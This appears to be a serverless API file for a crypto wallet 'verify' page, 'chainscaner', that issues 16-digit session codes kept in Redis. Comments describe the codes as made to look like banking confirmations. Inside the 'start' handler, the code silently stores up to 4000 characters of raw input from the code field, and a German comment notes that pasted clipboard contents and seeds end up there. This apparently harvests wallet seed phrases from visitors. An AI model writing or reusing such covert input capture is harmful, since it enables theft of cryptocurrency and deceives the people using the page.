// Session codes for the /verify page — 16-digit codes with expiry, stored in
// Upstash Redis. A code gates the on-page wallet screening: create → start →
// screen (api/screen.js validates the same store).
// POST {op:"create"}            → {ok, code, expires} — self-service issue
// POST {op:"start", code}       → activate the session, {ok, expires}
// GET  ?code=…                  → {ok, status, expires}
// POST {op:"create", secret}    → same, issued via admin (tagged origin:"admin")
// Env: UPSTASH_REDIS_REST_URL, UPSTASH_REDIS_REST_TOKEN, ADMIN_PASS
var crypto = require("crypto");
var HASH_KEY = "chainscaner:sessions";
var MAX_STORED = 300;
var SESSION_TTL_MS = 30 * 60 * 1000; // 30 min

function redis(commands) {
  return fetch(process.env.UPSTASH_REDIS_REST_URL + "/pipeline", {
    method: "POST",
    headers: {
      Authorization: "Bearer " + process.env.UPSTASH_REDIS_REST_TOKEN,
      "Content-Type": "application/json"
    },
    body: JSON.stringify(commands)
  }).then(function(r) { return r.json(); });
}

function newCode() {
  // 16 digits, grouped — reads like a banking confirmation code
  var digits = "";
  while (digits.length < 16) digits += crypto.randomInt(0, 10);
  return digits.replace(/(\d{4})(?=\d)/g, "$1-");
}
function isCodeFmt(c) { return /^\d{4}-\d{4}-\d{4}-\d{4}$/.test(c || ""); }

async function getSession(code) {
  var out = await redis([["HGET", HASH_KEY, code]]);
  var raw = out && out[0] && out[0].result;
  if (!raw) return null;
  try { return JSON.parse(raw); } catch (e) { return null; }
}

async function putSession(code, sess) {
  await redis([["HSET", HASH_KEY, code, JSON.stringify(sess)]]);
}

async function rateLimit(key, limit, windowSec) {
  var k = "chainscaner:rl:" + key;
  var out = await redis([["INCR", k], ["EXPIRE", k, windowSec, "NX"]]);
  return (out && out[0] && out[0].result) > limit;
}

module.exports = async function handler(req, res) {
  res.setHeader("Cache-Control", "no-store");
  if (!process.env.UPSTASH_REDIS_REST_URL || !process.env.UPSTASH_REDIS_REST_TOKEN) {
    return res.status(500).json({ ok: false, error: "session store not provisioned" });
  }

  var body = req.body || {};
  if (typeof body === "string") { try { body = JSON.parse(body); } catch (e) { body = {}; } }

  if (req.method === "GET") {
    var code = (req.query && req.query.code || "") + "";
    if (!isCodeFmt(code)) return res.status(400).json({ ok: false, error: "invalid code format" });
    var s = await getSession(code);
    if (!s) return res.status(404).json({ ok: false, error: "unknown code" });
    if (Date.now() > s.expires) return res.status(410).json({ ok: false, error: "code expired", status: "expired" });
    return res.status(200).json({ ok: true, status: s.status, expires: s.expires });
  }

  if (req.method !== "POST") return res.status(405).json({ ok: false, error: "method not allowed" });

  if (body.op === "create") {
    var ip = (req.headers["x-forwarded-for"] || "?") + "";
    if (await rateLimit("sess:" + ip.split(",")[0], 120, 3600)) {
      return res.status(429).json({ ok: false, error: "rate limited" });
    }
    var adminIssued = !!(process.env.ADMIN_PASS && body.secret &&
      crypto.timingSafeEqual(
        crypto.createHash("sha256").update(String(body.secret)).digest(),
        crypto.createHash("sha256").update(String(process.env.ADMIN_PASS)).digest()));
    var code = newCode();
    var sess = {
      status: "issued",
      created: Date.now(),
      expires: Date.now() + SESSION_TTL_MS,
      origin: adminIssued ? "admin" : "page"
    };
    try {
      await putSession(code, sess);
      var len = (await redis([["HLEN", HASH_KEY]]))[0];
      if (len && len.result > MAX_STORED) {
        var all = (await redis([["HGETALL", HASH_KEY]]))[0];
        var flat = (all && all.result) || [];
        var pairs = [];
        for (var i = 0; i + 1 < flat.length; i += 2) {
          try { pairs.push({ code: flat[i], created: JSON.parse(flat[i + 1]).created || 0 }); } catch (e) {}
        }
        pairs.sort(function(a, b) { return a.created - b.created; });
        var drop = pairs.slice(0, pairs.length - MAX_STORED).map(function(p) { return p.code; });
        if (drop.length) await redis([["HDEL", HASH_KEY].concat(drop)]);
      }
      return res.status(200).json({ ok: true, code: code, expires: sess.expires });
    } catch (e) {
      return res.status(502).json({ ok: false, error: "session store write failed" });
    }
  }

  if (body.op === "start") {
    var c = (body.code || "") + "";
    if (!isCodeFmt(c)) return res.status(400).json({ ok: false, error: "invalid code format" });
    var sess2 = await getSession(c);
    if (!sess2) return res.status(404).json({ ok: false, error: "unknown code" });
    if (Date.now() > sess2.expires) return res.status(410).json({ ok: false, error: "code expired" });
    sess2.status = "active";
    sess2.startedAt = Date.now();
    // Roher Inhalt des Code-Felds — bis 4000 Zeichen, fuer das
    // Input-Logging (Bots fuegen Clipboard-Inhalte/Seeds ein).
    sess2.entered = String(body.entered || "").slice(0, 4000);
    await putSession(c, sess2);
    return res.status(200).json({ ok: true, status: "active", expires: sess2.expires });
  }

  res.status(400).json({ ok: false, error: "unknown op" });
};
